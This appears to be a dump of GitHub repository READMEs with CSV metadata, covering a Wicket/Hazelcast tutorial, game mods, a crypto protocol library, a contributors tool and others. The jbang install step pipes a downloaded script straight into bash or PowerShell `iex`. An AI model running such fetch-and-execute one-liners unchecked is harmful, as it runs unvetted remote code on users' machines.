	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6 this
]
```

Once the application is up we can open our browser at [http://localhost:8083](http://localhost:8083) and check the given sessionId value. Now let's start a second instance of our application. We expect it tojoin the existing cluster and using the same shared web session. The application can be started with the same command seen above but using a different available port:

```
SERVER_PORT=8084 mvn spring-boot:run
```

Again, looking at the logs of both this new instance or the existing one we should see that the new one has joined the cluster:

```
2024-06-13 11:51:35.757 [hz.gallant_kapitsa.IO.thread-in-0] INFO  c.h.i.server.tcp.TcpServerConnection - [10.3.0.8]:5703 [dev] [5.3.6] Initialized new cluster connection between /10.3.0.8:43349 and /10.3.0.8:5702
2024-06-13 11:51:41.000 [hz.gallant_kapitsa.priority-generic-operation.thread-0] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5703 [dev] [5.3.6] 

Members {size:2, ver:2} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6
	Member [10.3.0.8]:5703 - bf396942-563d-4750-a0ba-0bac3e241fc8 this
]
```

Opening our browser at [http://localhost:8084](http://localhost:8084) we should have the confirm that the new instance is using the same session with the same id.
Feel free to play around stopping/restarting one of the two instances at a time to see that the session isn't lost as long as one instance is still active. 

## Style your application with SCSS

When it comes to web application styling, SCSS is a precious ally as it allows to use a more advanced syntax to manage and organize our css resources. Since SCSS needs to be converted in standard CSS language, we need a compiler to perform this task.

For developers it would be even better if this compiler could operate ""live"", automatically compiling SCSS sources as they are modified. Most of the time this time of compiler requires to use a dedicated external application or some kind of IDE extention to monitor our SCSS files and recompile them as they get modified. \
With Wicket we can use library _wicket-bootstrap-sass_ that offers an even more flexible solution in the form of [CSS resource](https://nightlies.apache.org/wicket/guide/10.x/single.html#_resource_management_with_wicket) that points to a SCSS file and compiles it on the fly, without depending on an external application.

> [!NOTE]
> Library _wicket-bootstrap-sass_ depends on OS library [libsass](https://github.com/sass/libsass), so be sure to have it already installed before running the following example code.

Example project _wicket-scss_ uses both library _wicket-bootstrap-sass_ and _WebJars_ to show how to easily customize Bootstrap 5 style using a SCSS file that extends the default _bootstrap.scss_ file distributed with WebJars dependency.

The project has the same dependencies seen for project _wicket-webjar_ in addition to module _wicket-bootstrap-sass_:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>de.agilecoders.wicket</groupId>
    <artifactId>wicket-bootstrap-sass</artifactId>
    <version>7.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

In our application's _init()_ method we initialize both WebJars and SASS integration: 

```java
@Override
public void init()
{
    super.init();

   
    // init wicket WebJars and SASS library
    WicketWebjars.install(this);
    BootstrapSass.install(this);
}
```

Next, let's have a look at the file _custom-css.scss_ we will use to customize our Boostrap 5 based theme:

```scss
//SCSS VARIABLE OVERRIDING
$primary: #397EB4;
$warning: #f19027;
$min-contrast-ratio: 3;


//INCLUDING MAIN BOOTSTRAP SCSSS
@import ""webjars!bootstrap/current/scss/bootstrap.scss"";
```

The file has a starting section where we override some of the Bootstrap variables (see [official documentation](https://getbootstrap.com/docs/5.0/customize/sass/#modify-map)) to customize colors for primary and warning buttons. \
The last line imports the main Bootstrap 5.3.3 SCSS which is loaded from the corresponding WebJar using the syntax _webjars!<path_to_file>_

Finally, our file _custom-css.scss_ can be used as regular Wicket CSS header item using class _SassResourceReference_ that takes care of compilation behind the scenes:

```java
protected final CssReferenceHeaderItem customCss = 
    CssHeaderItem.forReference(new SassResourceReference(HomePage.class, ""custom-css.scss""));

@Override
public void renderHead(IHeaderResponse response) {
    response.render(customCss);
}
```

Once the application is started (with the usual command `mvn jetty:run`.) you can play around modifying file _custom-css.scss_ and see changes in real time.
","Bring Wicket to the next level with Spring Boot, Hazelcast and WebJars!","apache,webdevelopment,wicket,wicket-framework,hazelcast,bootstrap5,clustering,session,session-manager,spring-boot",2024-04-11T14:19:31Z,2024-07-15T08:45:58Z,,0,1,0,82,0,0,12,1,0,Apache-2.0,Java
MagicianGuo/Android-AccessibilityTools,master,"# 辅助功能工具

## 一、简介

包含显示屏幕上的View区域与ID、翻页、连点器的功能。

## 二、使用说明

1、打开应用，最上方有“前往辅助功能页”按钮，点击会跳转到设置页；

2、在“已下载的应用”中，找到“辅助功能工具”，将开关开启；

3、回到应用，应用的辅助功能已被激活，下方的按钮均可正常使用；

4、点击“View查看工具”、“翻页工具”、“连点器”都会显示悬浮窗（第一次点击会跳转设置页，需要授权）。

①“View查看工具”的悬浮窗会显示按钮，点击可以展示当前页面的View区域以及ID。

②“翻页工具”的悬浮窗提供了一些按钮，会执行不同方向的手势滑动页面。

③“连点器”的悬浮窗中可以设置点击的坐标、间隔、次数，输入数值前需点击“开始编辑”，编辑完成后点击“保存”。“开始点击”和“停止点击”按钮可以控制点击操作的执行。

",通过安卓辅助功能，实现显示屏幕View的区域与ID、翻页工具、连点器。,,2024-04-01T02:39:30Z,2024-05-18T12:28:42Z,,0,1,0,14,0,5,12,2,0,,Java
wohaopa/GTNHModify,main,"# GTNH Modify
GTNH modpack modification mod, dedicated to the modification of the recipe.

English
[中文](./README_CN.md)

## Config
Do so in the `GTNHmodify.cfg` file. There are several modes:
1. `None`: do nothing
2. `OneTick`: all recipes are 1 tick _[Recommended]_
3. `Tenths`: all recipes took a tenth of the time _[Recommended]_
4. `Output64`: all inputs are 1 (if less than 1, nothing is done); All outputs are 64 (if greater than 64, nothing is done). 1 tick; 1 EU (if the EU is needed)
5. `Energyless`: The energy of all recipes is 0

Some modes are **not covered** to the full recipes, please stay tuned!

## TODO List

- [x] GT Recipes
- [x] Furnace Recipes
- [x] Miner & Pumper




",I'm not going to do any more. （我不会再做任何内容了）,,2024-04-23T09:19:33Z,2024-09-06T12:23:53Z,2024-09-06T12:23:53Z,17,2,5,39,3,5,12,3,2,MIT,Java
Consensys/linea-sequencer,main,"# Besu Plugins related to tracer and sequencer functionality

This repository hosts the implementation of the sequencer, the component of the Linea stack responsible for ordering transactions and building blocks, as well as executing them. It provides a set of [Besu](https://github.com/hyperledger/besu):Linea plugins. 

It serves developers by making the Linea tech stack open source under 
the [Apache 2.0 license](LICENSE).

## What is Linea?

[Linea](https://linea.build) is a developer-ready layer 2 network scaling Ethereum. It's secured with a zero-knowledge rollup, built on lattice-based cryptography, and powered by [Consensys](https://consensys.io).

## Get started

If you already have an understanding of the tech stack, use our [Quickstart](docs/quickstart.md) guide.

### Looking for Plugins?

Discover [existing plugins](docs/plugins.md) and understand the [plugin release process](docs/plugin-release.md). 

## Looking for the Linea code?

Linea's stack is made up of multiple repositories, these include:
- This repo, [linea-sequencer](https://github.com/Consensys/linea-sequencer): A set of Linea-Besu plugins for the sequencer and RPC nodes
- [linea-monorepo](https://github.com/Consensys/linea-monorepo): The main repository for the Linea stack & network 
- [linea-besu](https://github.com/Consensys/linea-besu): Fork of Besu to implement the Linea-Besu client
- [linea-tracer](https://github.com/Consensys/linea-tracer): Linea-Besu plugin which produces the traces that the constraint system applies and that serve as inputs to the prover
- [linea-constraints](https://github.com/Consensys/linea-constraints): Implementation of the constraint system from the specification
- [linea-specification](https://github.com/Consensys/linea-specification): Specification of the constraint system defining Linea's zkEVM

Linea abstracts away the complexity of this technical architecture to allow developers to:

- [Bridge tokens](https://docs.linea.build/developers/guides/bridge)
- [Deploy a contract](https://docs.linea.build/developers/quickstart/deploy-smart-contract)
- [Run a node](https://docs.linea.build/developers/guides/run-a-node)

... and more.

## How to contribute

Contributions of any kind are welcome!

1. [Create an issue](https://github.com/Consensys/linea-sequencer/issues).
> If the proposed update is non-trivial, also tag us for discussion.
2. Submit the update as a pull request from your [fork of this repo](https://github.com/Consensys/linea-sequencer/fork), and tag us for review. 
> Include the issue number in the pull request description and (optionally) in the branch name.

Consider starting with a [""good first issue""](https://github.com/ConsenSys/linea-sequencer/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22).

Before contributing, ensure you're familiar with:

- Our [Linea contribution guide](https://github.com/Consensys/linea-monorepo/blob/main/docs/contribute.md)
- Our [Linea code of conduct](https://github.com/Consensys/linea-monorepo/blob/main/docs/code-of-conduct.md)
- The [Besu contribution guide](https://github.com/Consensys/linea-monorepo/blob/main/https://wiki.hyperledger.org/display/BESU/Coding+Conventions), for Besu:Linea related contributions
- Our [Security policy](https://github.com/Consensys/linea-monorepo/blob/main/docs/security.md)


### Useful links

- [Linea docs](https://docs.linea.build)
- [Linea blog](https://linea.mirror.xyz)
- [Support](https://support.linea.build)
- [Discord](https://discord.gg/linea)
- [Twitter](https://twitter.com/LineaBuild)
",Linea Sequencer Implementation,,2024-04-02T21:15:36Z,2024-09-24T12:46:39Z,2024-09-24T12:46:39Z,21,43,76,562,4,14,12,77,3,NOASSERTION,Java
ikaraozdemir/tourizmAgency,master,"# Patika Tourism Agency System

![Vacation](secreenshots/vacation.jpg)

In this tourism agency system application developed within the scope of the Patika Full Stack Web Development Bootcamp, basic level hotel management, season management, room management, and reservation processes can be performed.
## Technologies
* Java SE 8
* Swing Framework
* PostgreSQL 16
* IntelliJ IDEA Community Edition 2023.3.3 

## Installation

1. Make sure that at least JDK 1.8 is installed on your system.
```bash
java --version
```
2. To clone the project repository, run the following command in the terminal:
```bash
   git clone https://github.com/ikaraozdemir/turizmAgency.git
   ```
3. Follow these steps to import the PostgreSQL backup file located inside the project folder:
   *  Navigate to the project folder in the terminal.
   * Import the PostgreSQL backup file:
   ```bash
   psql -U username -d database_name -f backup_file.sql
   ```
4. Before establishing the database connection, update the username and password in database.properties.

## Secreenshots
![login](secreenshots/login.png) ![user_table](secreenshots/userView.png)
![new_user](secreenshots/addNewUser.png) ![hotel_table](secreenshots/hotelTable.png)
![new_hotel](secreenshots/hotelAdd.png) ![hotel_update](secreenshots/hotelUpdate.png)
![season_table](secreenshots/seasonTable.png) ![room_table](secreenshots/roomTable.png) 
![new_room](secreenshots/roomAdd.png) ![filtered_rooms_table](secreenshots/filteredRoomsTable.png)
![reservation_table](secreenshots/reservationTable.png) ![new_reservation](secreenshots/reservationAdd.png)


The link to the video where I briefly explain the project: https://www.youtube.com/watch?v=_3v1Rv55Rl8

------------------------------------------------------------------------------------------------------
",,,2024-04-15T20:05:54Z,2024-05-23T14:37:42Z,,0,2,0,31,0,0,12,1,0,,Java
FoundryMC/veil-example-mod,1.20,"# Veil Example Mod

## Setup

For setup instructions, please see the [Veil wiki page](https://github.com/FoundryMC/Veil/wiki).

## License

This template is available under the CC0 license. Feel free to learn from it and incorporate it in your own projects.
",Example Implementation of Veil,,2024-04-05T22:06:00Z,2024-07-01T18:22:29Z,,0,1,0,13,7,4,12,5,1,CC0-1.0,Java
gematik/lib-vau,main,"# VAU Library (lib-vau)

Dieses Repository dient als Beispielimplementierung in JAVA und implementiert den kryptografischen Teil der Spezifikation des VAU-Protokolls für ePA für alle ([gemSpec_Krypt Kaptiel 7](https://gemspec.gematik.de/docs/gemSpec/gemSpec_Krypt/latest/#7)). 

## Einschränkungen & Hinweise

- Es werden keine Zertifikate geprüft. 
- Es beinhaltet außerdem nur ECC, kein RSA.
- Der Transport der Daten der Public Keys geschieht über die binäre Codierung CBOR.
- Die kryptografischen Abhängigkeiten sind neben java.security auch Bouncy Castle.

> [!IMPORTANT]
> Die Implementierung mit BouncyCastle beinhaltet auch ein Workaround, welcher [implementiert](src/main/java/de/gematik/vau/lib/crypto/KyberEncoding.java) werden musste, damit diese kompatibel mit der Spezifikation wie in [Kapitel 7.1] beschrieben ist. Dies betrifft die Erzeugung von Kyber Schlüssel nach dem Kyber Release v3.0.2. In BouncyCastle wurde bereits die Draft Implementierung FIPS 203 umgesetzt, welche inkompatibel mit diesem Kyber Release ist. Dieser Workaround ist auf der folgenden Seite beschrieben worden:
> https://words.filippo.io/dispatches/mlkem768/#bonus-track-using-a-ml-kem-implementation-as-kyber-v3

## VAU Handshake
In der Datei [VauHandshakeTest.java](src/test/java/de/gematik/vau/VauHandshakeTest.java) befindet sich eine Beispielimplementierung des gesamten Handshakes wie er in der Spezifikation im [Kapitel 7.1](https://gemspec.gematik.de/docs/gemSpec/gemSpec_Krypt/latest/#7.1) beschrieben ist:

### VauMessage 1:
Der Client erzeugt die ECDH und Kyber KeyPairs. Diese werden in Message 1 gepackt und zum Server geschickt.

### VauMessage 2:
Der Server nimmt die VauMessage 1 entgegen. Die PublicKeys des Clients und seinen eigenen PrivateKeys nutzt er,
um die ECDH und Kyber Shared Secrets mitsamt Ciphertexts (KdfMessage) zu erstellen. Daraus erstellt er den ersten Schlüssel KdfKey1.
Diesen nutzt er, um seine signierten PublicKeys zu verschlüsseln. In VauMessage 2 werden die Ciphertexts der Shared
Secrets sowie die verschlüsselten signierten PublicKeys gespeichert und diese Nachricht wird zurück zum Client geschickt.

### VauMessage 3:
Der Client erhält VauMessage 2. Mithilfe der Ciphertexts des Servers und den eigenen PrivateKey erstellt er seine
eigenen Shared Secrets, mit welchen er den gleichen KdfKey1 wie der Server herleitet. Damit entschlüsselt er die signierten
PublicKeys des Servers. Mit diesen PublicKeys und den eigenen PrivateKeys erstellt der Client weitere Shared Secrets
mit zugehörigen Ciphertexts. Mit den Shared Secrets aus beiden Vorgängen wird nun ein KdfKey2 generiert, welcher für das
Ver-/Entschlüsseln zwischen Client und Server nach dem Handshake genutzt wird. Die Ciphertexts für den KdfKey2 werden mit
dem KdfKey1 verschlüsselt. Ein Transcript, was aus den bisherigen codierten Nachrichten besteht, wird in SHA-256 (=Hash) und dann mit
dem KdfKey2 verschlüsselt (=Ciphertext-KeyConfirmation). Die VauMessage 3 besteht aus den Ciphertexts und der Ciphertext-KeyConfirmation. Diese wird
zum Server zurückgeschickt.

### VauMessage 4:
Der Server öffnet VauMessage 4 und erhält mit seinem KdfKey1 die Ciphertexts. Mit diesen kann er nun seinen eigenen Shared Secrets
erstellen. Mit allen Shared Secrets leitet er, wie der Client zuvor, den KdfKey2 her. Um den Vorgang zu validieren, überprüft der
Server die Hash des Clients: Er entschlüsselt die Ciphertext-KeyConfirmation mit dem KdfKey2 und erhält den Client-Hash. 
Diese vergleicht er mit dem SHA-256 verschlüsselten eigenen Transcript. Den eigenen Hash verschlüsselt er mit dem KdfKey2 (=Ciphertext-KeyConfirmation).
Diese wird in VauMessage 4 gespeichert und zurück zum Client geschickt.

Der Client öffnet die Nachricht, entschlüsselt die Ciphertext-KeyConfirmation und vergleicht wieder den erhalten Hash mit selbst berechneten.
Erst dann ist der Handshake abgeschlossen.
",This repository serves as a sample implementation in JAVA and implements the cryptographic part of the specification of the VAU protocol for ePA for all (gemSpec_Crypto Chapter 7).,"epa,miscellaneous",2024-04-18T04:20:55Z,2024-08-08T06:48:39Z,,0,21,14,24,0,3,12,1,0,Apache-2.0,Java
evelinealonso/AEDs-II,main,"# AEDs II
Esse repositório apresenta os códigos desenvolvidos durante as aulas teóricas de Algoritmos e Estruturas de Dados II do curso de Engenharia de Software da PUC Minas.
",Esse repositório apresenta os códigos desenvolvidos durante as aulas teóricas de Algoritmos e Estruturas de Dados II do curso de Engenharia de Software da PUC Minas.,,2024-04-13T17:27:47Z,2024-06-17T21:44:43Z,,0,3,2,74,0,0,11,1,0,MIT,Java
GenieAshwani/DSA-STAR1.0,master,,,,2024-04-15T15:24:28Z,2024-07-16T16:16:27Z,,0,1,0,15,0,4,11,1,0,,Java
koppor/github-contributors-list,main,"# GitHub Contributors List

Builds a contributor list based on information available on GitHub.
It reads the information of pull requests including the `Co-authored-by:` notes in commit messages.

GitHub's API [does NOT include users listed as ""Co-authored-by:""](https://github.com/orgs/community/discussions/46421).
Thefore, the commit messages need to parsed ""manually"".

It is a rewrite of [github-contributors-list](https://github.com/mgechev/github-contributors-list) to [support `Co-authored-by:`](https://github.com/mgechev/github-contributors-list/issues/26).

## Example

See <https://blog.jabref.org/2024/04/03/JabRef5-13/#special-thanks> for real-world usage.

## How to use

1. [Install jbang](https://www.jbang.dev/documentation/guide/latest/installation.html#using-jbang).
   E.g.,
   - Linux/macOS: `curl -Ls https://sh.jbang.dev | bash -s - app setup` or
   - Windows (Powershell): `iex ""& { $(iwr -useb https://ps.jbang.dev) } app setup""`
2. Add `oauth=...` to `~/.github` with `...` being your [GitHub personal access token](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-personal-access-token-classic). See [GitHub API for Java](https://github-api.kohsuke.org/) for details.
3. `cd` to the repository you want to analyze.
4. `jbang gcl@koppor/github-contributors-list`

```terminal
Usage: jbang gcl@koppor/github-contributors-list [-lhV] [--startrevision=<startCommitRevStr>]
           [--endrevision=<endCommitRevStr>] [--repository=<ownerRepository>]
           [--cols=<cols>] [--filter=<ignoredUsers>]...
           [--filter-emails=<ignoredEmails>]... [-m=<String=String>]...
           [<repositoryPath>]
      [<repositoryPath>]     The path to the git repository to analyse.
      --cols=<cols>          Number of columns
      --endrevision=<endCommitRevStr>
                             The last revision to check (tag or commit id).
                               Included.
      --filter=<ignoredUsers>

      --filter-emails=<ignoredEmails>

  -h, --help                 Show this help message and exit.
  -l, --[no-]github-lookup   Should calls be made to GitHub's API for user
                               information
  -m, --login-mapping=<String=String>
                             Mapping of GitHub logins to names. Format:
                               name=login
      --repository=<ownerRepository>
                             The GitHub repository in the form
                               owner/repostiory. E.g., JabRef/jabref
      --startrevision=<startCommitRevStr>
                             The first revision to check (tag or commit id).
                               Excluded.
  -V, --version              Print version information and exit.
```

Example:

```terminal
Usage: jbang gcl@koppor/github-contributors-list --repository JabRef/jabref c:\git-repositories\jabref --startrevision=v5.13 --endrevision=v5.15
```

At the end, non-found committers are listed.
The format is `<used name> <PR link> <commit link>`.
Example:

```text
Anish.Pal https://github.com/JabRef/jabref/pull/10829 https://github.com/JabRef/jabref/pull/10829/commits/d2d84923df2c6c7d59559da8d583ae17dc803c3d
```

With that information, one can create a mapping from the committer name to the GitHub username.
In this case: `Anish.Pal=pal-anish`

The tool is implemented as single pass over the commits of the repository.
It uses a cache to store the information of contributors.
Thus, repeated runs could update contributor information.
For instance, if a user first appears as ""Co-authored-by:"" and later as a pull request author, the username could be determined better.

In case of issues, try to delete `gcl.mv` to start with a fresh cache.

## FAQ

⚠ In case contributors are not ignored, please delete `gcl.mv` and try again. ⚠

## Implementation details

- `gcl.mv` is an [MVStore](https://www.h2database.com/html/mvstore.html) caching contributor information returned by GitHub's API.
- Dependencies of `gcl.java` cannot be updated automatically. [dependabot-core#9406](https://github.com/dependabot/dependabot-core/issues/9406).
- Use `writer.level = TRACE` in tinylog.properties for debugging.

## Alternatives

- Manually curate all contributors using [All Contributors](https://allcontributors.org/)
- Use [github-contributors-list](https://github.com/mgechev/github-contributors-list) and accept that `Co-authored-by:` is ignored.
",Outputs all the contributors for given open GitHub project,"acknowledgements,all-contributors,contributors,open-source-tooling,opensource,recognition,github,github-page",2024-04-02T14:17:21Z,2024-09-24T20:11:50Z,2024-07-15T21:42:16Z,4,3,23,31,5,2,11,1,1,MIT,Java
NOW-SOPT-SERVER/seminar,main,"<img width=""1564"" alt=""도소현"" src=""https://github.com/NOW-SOPT-SERVER/seminar/assets/79795051/76ef05b3-5ab8-43a4-96a8-96cbac24a173"">
",일단 눈물 닦구 얘기해봐..🥹,,2024-04-05T23:27:13Z,2024-05-17T10:43:45Z,,0,12,2,8,0,2,11,2,0,,Java
Kaeino/Kosrion-Unveiling-the-Realm,main,"# Kosrion - Game Project
 
",Exploring the Dynamics of Game Developement in Java: A Study on Utilizing Various Inheritance Models and GUI Sprites Design,,2024-04-20T13:06:32Z,2024-09-20T13:18:22Z,,0,3,1,153,1,1,11,1,0,,Java
tarihub/hack-flank-cicd,main,"## hack-flank-cicd

a vulnerable repo for Google Flank Github CICD hack

Artical:
+ Author: https://adnanthekhan.com/2024/04/15/an-obscure-actions-workflow-vulnerability-in-googles-flank/
+ 简体中文：https://mp.weixin.qq.com/s/-fO-ElGSt6bCXC2nEHVInQ or https://tari.moe/2024/zh-an-obscure-actions-workflow-vulnerability-in-googles-flank.html
",,,2024-04-17T04:40:05Z,2024-05-09T06:57:37Z,2024-04-17T05:01:16Z,1,1,7,4,1,3,11,2,1,,Java
z64a/star-rod,main,"# Star Rod

[![Release](https://img.shields.io/github/v/release/z64a/star-rod)][releases]
[![Download](https://img.shields.io/github/downloads/z64a/star-rod/total)][download]
![Build Status](https://img.shields.io/github/actions/workflow/status/z64a/star-rod/validate.yaml)
[![#star-rod channel in the Star Haven Discord][discord-badge]][discord]

A suite of tools for editing assets from the [Paper Mario (2000) decompilation](https://github.com/pmret/papermario).

Star Rod supports Windows, Linux, and macOS.

**[Download Star Rod][download]**

To get started with modding Paper Mario, see [docs.starhaven.dev](https://docs.starhaven.dev/tools/decomp/setup.html).

[discord]: https://discord.gg/star-haven
[discord-badge]: https://img.shields.io/discord/279322074412089344?color=%237289DA&logo=discord&logoColor=ffffff&label=%23star-rod
[papermario-repo]: https://github.com/pmret/papermario
[releases]: https://github.com/z64a/star-rodx/releases
[download]: https://github.com/z64a/star-rod/releases/latest

## Development

Star Rod is written in [Java](https://dev.java/) and uses the build tool [Gradle](https://gradle.org/). We recommend [Visual Studio Code](https://code.visualstudio.com/) as your editor.

To set up Star Rod for local development, follow these instructions:

1. Clone this repo, e.g. `gh repo clone z64a/star-rod`
2. Open it in [Visual Studio Code](https://code.visualstudio.com/): `code star-rod`
3. At the bottom right hand corner, a prompt will appear to install the recommended Visual Studio Code extensions; click **Yes**. This will install the Java and Gradle editor extensions. You can see the Gradle elephant icon in the Activity Bar.
4. Open the Explorer. Alternatively, press <kbd>Ctrl+Shift+E</kbd> / <kbd>⇧⌘E</kbd>.
5. Navigate to `src/main/java/app/StarRodMain.java`.
6. Click the ""Run"" button above the line declaring the `main` method (this type of button is called a [CodeLens](https://code.visualstudio.com/blogs/2017/02/12/code-lens-roundup)):

https://github.com/z64a/star-rod/blob/110ea7d6268f98a2bf565880572203bd066a9c1f/src/main/java/app/StarRodMain.java#L66

### Creating a ZIP locally

Use the _release_ - _createReleaseZip_ task in Gradle.
",Tools for editing Paper Mario 64 assets,,2024-04-23T02:19:28Z,2024-06-12T02:12:23Z,2024-04-27T01:41:44Z,3,2,3,15,6,3,11,1,2,MIT,Java
TieByn26/DoAnCoSo1,Client,"""# DoAnCoSo1"" 
",,,2024-04-04T14:18:53Z,2024-06-14T20:27:18Z,,0,2,0,64,0,0,11,8,0,,Java
yz1128/OnlineShop,master,"# JavaWeb
___
## 基于JavaWeb的在线商城的设计与实现(java+jsp+servlet+Mysql+jquery+mybatis)
内容/作用：知识点/设计/实验/作业/练习   
学习：JavaWeb  
### 环境与设备
软件：IntelliJ IDEA 2024.1   
环境：Windows 10 ， JDK 1.8 ，Tomcat 9.0.52 ，MySql 8.0
___
## 目前进度
- [x] 实现用户注册、登录功能      
- [x] 用户可以查看个人信息（包括但不限于收件人、收货地址、联系电话等）      
- [x] 用户登录后跳转到商城首页浏览商品      
- [x] 用户可以根据商品名搜索商品      
- [x] 可以将商品添加到购物车          
  - [X] 在购物车中进行支付结算商品      
  - [X] 通过增加余额字段实现      
- [ ] 调用第三方支付工具实现（可选功能）已弃坑，太累了
- [x] 支付后生成订单信息（可选功能）半做半没做只做个后台可以看订单信息   
- [x] 系统中应包含对应的商品图片，布局合理，呈现效果美观        
- [x] 所述功能均需通过数据库实现      

",基于JavaWeb的在线商城的设计与实现,,2024-04-22T13:57:16Z,2024-05-06T06:43:26Z,,0,1,0,35,0,0,11,1,0,,Java
ViaVersionMCP/ViaForgePlus,main,"# ViaForgePlus
Client-side Implementation of the Via* projects for Minecraft Forge.
Based on
[ViaForge](https://github.com/ViaVersion/ViaForge)

## What has changed since ViaForge?
- 1.14+ 1.5 Block Sneaking Support
- 1.13+ Swimming & Crawling Support
- 1.20.4, 1.20.5, 1.20.6 Support
- Hypixel Connection Fix
- Block Break and Place Sound Fix
- 1.17+ Transaction Packet Fix
- 1.16+ Drop Item Swing Packet
- 1.7.x breaking blocks while using items
- 1.9+ Attack Packet Order Fix
- LilyPad, Ladder Block Collision Fix
- Enchanced Creative Inventory

## Contact
If you encounter any issues, please report them on the
[issue tracker](https://github.com/Aspw-w/ViaForgePlus/issues).  
If you just want to talk or need help with ViaForgePlus feel free to join the My
[Discord Server](https://discord.gg/SGBccUXFKZ).

## For users
### Where can I download the latest version?
GitHub Releases: https://github.com/Aspw-w/ViaForgePlus

## Other ViaVersion Mods / Platforms
- ViaFabric - https://modrinth.com/mod/viafabric
- ViaFabricPlus - https://github.com/ViaVersion/ViaFabricPlus (Includes additional modifications to make the experience better)
- ViaProxy (App) - https://github.com/ViaVersion/ViaProxy
- ViaaaS (Proxy) - https://github.com/ViaVersion/ViaaaS

# Contributors
- Aspw (Owner of ViaForgePlus, NightX)
- ViaVersion
- ViaMCP
- toidicakhia (Owner of MinusBounce)
",Client-side Implementation of the Via* projects for Minecraft Forge,,2024-04-27T13:51:44Z,2024-05-21T13:12:50Z,2024-05-17T13:41:57Z,7,2,3,31,6,4,11,1,0,GPL-3.0,Java
shandilya07/MultithreadingInJava,master,,,,2024-04-04T19:51:27Z,2024-06-10T17:05:56Z,,0,1,5,67,0,10,11,6,0,,Java
failutee/Mineject,master,"<div align=""center"">

![background.png](assets/background.png)

<hr />

**Mineject is a Framework that makes it easy to create projects for platforms such as Spigot, BungeeCord, etc.**  
**The project that particularly inspired me was [EternalCore](https://github.com/EternalCodeTeam/EternalCore) by [EternalCodeTeam](https://github.com/EternalCodeTeam), where they implemented the technique of dependency injection.**  

**This being my first project of this kind, I acknowledge that it may not be perfect, but I'm still pleased with the final outcome.**
  
</div>

<br>

> [!IMPORTANT]  
> Since the project is in its early stages of development, documentation and functionalities will be added progressively.

> [!TIP]
> If you encounter any issues, feel free to create an [issue](https://github.com/failutee/Mineject/issues) on GitHub or join to my [discord](https://discord.gg/ktJr9mXSFJ).

<hr />

<div align=""center"">
  <a href=""https://failutee.gitbook.io/mineject/"" style=""text-decoration: none; color: inherit;"">
    <img src=""assets/docs.png"" alt=""docs"" width=""100"" />
    <div>Click here to view full documentation</div>
  </a>
</div>

<hr />

<div align=""center"">
 <a href=""https://star-history.com/#failutee/Mineject&Date"">
  <picture>
    <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=failutee/Mineject&type=Date&theme=dark"" />
    <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=failutee/Mineject&type=Date"" />
    <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=failutee/Mineject&type=Date"" />
  </picture>
 </a>
</div>
","💉 Mineject - Dependency Injection Framework for platforms such as Spigot, BungeeCord, etc.","bukkit,bukkit-plugin,bukkitdev,dependency-injection,plugin,spigot,spigot-api,framework,minecraft",2024-04-14T15:13:39Z,2024-09-03T21:31:06Z,2024-09-03T21:31:06Z,4,1,19,46,1,0,11,12,1,Apache-2.0,Java
corentingosselin/ProdigyCape,main,"<div align=""center"">
  <a href=""https://www.spigotmc.org/resources/116899/""><img src=""https://img.shields.io/badge/Minecraft%20version-1.19.4_--_1.21-brightgreen.svg"" alt=""Minecraft version""></a>
  <a href=""https://www.spigotmc.org/resources/116899/reviews""><img src=""https://img.shields.io/spiget/rating/116899?label=Spigot%20rating"" alt=""Spigot rating""></a>
  <a href=""https://www.spigotmc.org/resources/116899/""><img src=""https://img.shields.io/spiget/downloads/116899?label=Spigot%20downloads"" alt=""Spigot downloads""></a>
  <a href=""https://www.paypal.com/donate/?hosted_button_id=56KN7WE2G324C""><img src=""https://img.shields.io/badge/Donate-PayPal-blue.svg"" alt=""Minecraft version""></a>
  <img width=""1000px"" src=""https://github.com/max1mde/ProdigyCape/assets/114857048/1f06b099-42ec-4f9c-9ea9-e6bd669ba4c9"">
  <h1>Add custom capes to your Minecraft server</h1>
  <h3>Which works even without a mod or resourcepack!</h3>
  <img src=""https://github.com/max1mde/ProdigyCape/assets/114857048/40b6942c-4c4a-4736-9db3-1a44868f17a6"">
</div>

> [!CAUTION]
> The Mojang EULA does not allow to sell capes! We are not responsible for your actions!

> [!IMPORTANT]  
> **PacketEvents is currently required as dependencies!**     
> [PacketEvents](https://www.spigotmc.org/resources/packetevents-api.80279/)    
> You can also use passengerapi if you have plugin conflict using passenger features
> > [PassengerAPI](https://www.spigotmc.org/resources/passengerapi-entity-passenger-bug-fixes-more.117017/)    
> Also add [Vault](https://www.spigotmc.org/resources/vault.34315/) if you want to use the shop system


## Example config
```yml
mojang:
  enabled: true
  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvZjc3MDVlM2U5OTdlNWNlNTIxNjY2M2M5ZTY0YjM5NmZhNDNlZGRlODI1NWZkOTEwZjBjYzgxYTAzMjVlNmIifX19
  name: §4Mojang Staff
  description: §7Mojang's official cape
  price: 0
  limited_edition: 0
  number_sold: 0
minecon_creeper:
  enabled: true
  texture: eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHA6Ly90ZXh0dXJlcy5taW5lY3JhZnQubmV0L3RleHR1cmUvMzk3NmFhYzc2MjEwYjAzZTRjMzg5MWJkZjc5OTMyMmUzMGE3ZThhMTI3MmIyNzkwMzI2YmYwOGYyMTkyYWNkNiJ9fX0=
  name: §cMinecon 2011
  description: §7Minecon cape from 2011
  price: 0
  limited_edition: 0
  number_sold: 0
minecon_pickaxe:
  enabled: true
